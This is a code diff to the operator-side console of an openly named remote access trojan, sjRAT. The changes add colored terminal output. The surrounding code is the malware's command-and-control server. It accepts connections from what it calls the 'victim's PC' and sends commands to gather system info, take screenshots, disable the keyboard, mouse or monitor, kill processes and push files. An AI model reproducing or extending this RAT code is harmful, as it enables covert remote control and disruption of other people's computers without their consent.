@@ -1,5 +1,6 @@
 #include "includes.h"
 #include "UpDown.h"
+#include "colors.h"
 
 std::string GenerateRandomFilename()
 {
@@ -27,12 +28,16 @@ void SendAndReceive(SOCKET client, std::string command)
     int bytesReceived = recv(client, buff, sizeof(buff), 0);
     if (bytesReceived > 0) {
         buff[bytesReceived] = '\0';
+
+        ColoredText(F_CYAN); // set text color
+
         printf("[*] %s\n", buff);
     }
 }
 
 void help_menu()
 {
+    ColoredText(F_LIGHTCYAN);
     printf("==============HELP-MENU==============\n");
     printf("sysinfo - see information about victim's PC\n\n");
     printf("msgbox - summon MessageBox on victim's PC\n\n");
@@ -52,10 +57,13 @@ void help_menu()
     printf("help - see this message\n\n");
     printf("exit - exit sjRAT and terminate client session\n\n");
     printf("=====================================\n");
+    ColoredText(F_WHITE);
 }
 
 void banner()
 {
+    ColoredText(F_DARKGRAY);
+
     printf("=========================https://github.com/Quality15/sjRAT========================\n");
     printf("   d888888o.             8 8888 8 888888888o.            .8.    8888888 8888888888 \n");
     printf(" .`8888:' `88.           8 8888 8 8888    `88.          .888.         8 8888       \n");
@@ -68,6 +76,8 @@ void banner()
     printf("`8b.  ;8.`8888  `88o.    8 88'  8 8888   `8b.    .888888888. `88888.  8 8888       \n");
     printf(" `Y8888P ,88P'    `Y888888 '    8 8888     `88. .8'       `8. `88888. 8 8888       \n");
     printf("================================v%s=============================================\n", VERSION.c_str());
+
+    ColoredText(F_WHITE); // reset
 }
 
 void MeasurePingTime(SOCKET client)
@@ -98,6 +108,8 @@ int main(int argc, char* argv[])
     // Show banner
     banner();
 
+    // HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE); // for changing text color
+
     // Startup WinSock
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -118,6 +130,7 @@ int main(int argc, char* argv[])
 
     SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL); // socket that listens for connetions
     bind(sListen, (SOCKADDR*)&addr, sizeof(addr)); // bind address to the socket
+    ColoredText(F_MAGENTA);
     printf("[*] Listening for connections...\n");
     listen(sListen, SOMAXCONN); // start listen for connections
 
@@ -133,6 +146,7 @@ int main(int argc, char* argv[])
         int addrSize = sizeof(addr_in);
         getpeername(client, (struct sockaddr*)&addr_in, &addrSize);
         const char* clientIP = inet_ntoa(addr_in.sin_addr);
+        ColoredText(F_GREEN);
         printf("[+] New connection from %s!\n", clientIP);
         
         bool clientConnected = true;
@@ -140,6 +154,7 @@ int main(int argc, char* argv[])
         std::string command;
         while (true) 
         {
+            ColoredText(F_GREEN);
             std::cout << "sj> ";
             std::getline(std::cin, command);
 
@@ -153,9 +168,11 @@ int main(int argc, char* argv[])
                         int dur = std::stoi(durStr);
                         SendAndReceive(client, command);
                     } else {
+                        ColoredText(F_LIGHTRED);
                         printf("[!] Usage: beep <duration (in seconds)>\n");
                     }
                 } else {
+                    ColoredText(F_LIGHTRED);
                     printf("[!] Usage: beep <duration (in seconds)>\n");
                 }
             }
@@ -168,6 +185,7 @@ int main(int argc, char* argv[])
                     SendAndReceive(client, command);
                     SendFile(client, &filename[0]);
                 } else {
+                    ColoredText(F_LIGHTRED);
                     printf("[!] Usage: upload <filename>\n");
                 }
             }
@@ -190,6 +208,7 @@ int main(int argc, char* argv[])
                 } else if (state == "off") {
                     SendAndReceive(client, command);
                 } else {
+                    ColoredText(F_LIGHTRED);
                     printf("[!] Usage: keyboard off/on\n");
                 }
             }
@@ -200,6 +219,7 @@ int main(int argc, char* argv[])
                 } else if (state == "off") {
                     SendAndReceive(client, command);
                 } else {
+                    ColoredText(F_LIGHTRED);
                     printf("[!] Usage: mouse off/on\n");
                 }
             }
@@ -210,6 +230,7 @@ int main(int argc, char* argv[])
                 } else if (state == "off") {
                     SendAndReceive(client, command);
                 } else {
+                    ColoredText(F_LIGHTRED);
                     printf("[!] Usage: monitor off/on\n");
                 }
             }
@@ -228,6 +249,7 @@ int main(int argc, char* argv[])
                     std::string pidStr = command.substr(5);
                     SendAndReceive(client, command);
                 } else {
+                    ColoredText(F_LIGHTRED);
                     printf("[!] Usage: kill <pid>\n");
                 }
             }
@@ -237,12 +259,14 @@ int main(int argc, char* argv[])
 
                 std::string filename = GenerateRandomFilename() + ".bmp";
                 ReceiveFile(client, filename);
+                ColoredText(F_CYAN);
                 printf("[*] Screenshot received: %s\n", filename.c_str());
 
                 // open screenshot
                 HINSTANCE hInstance = ShellExecute(NULL, "open", filename.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
                 if ((int)hInstance <= 32)
                 {
+                    ColoredText(F_LIGHTRED);
                     printf("[*] Failed to open %s\n", filename);
                 }
             }
@@ -261,6 +285,7 @@ int main(int argc, char* argv[])
                     SendAndReceive(client, command); // send `send sound.mp3s` command                    
                     SendFile(client, file.c_str()); // sendinf file to client
                 } else {
+                    ColoredText(F_LIGHTRED);
                     printf("[!] Usage: play <file>\n");
                 }
             }
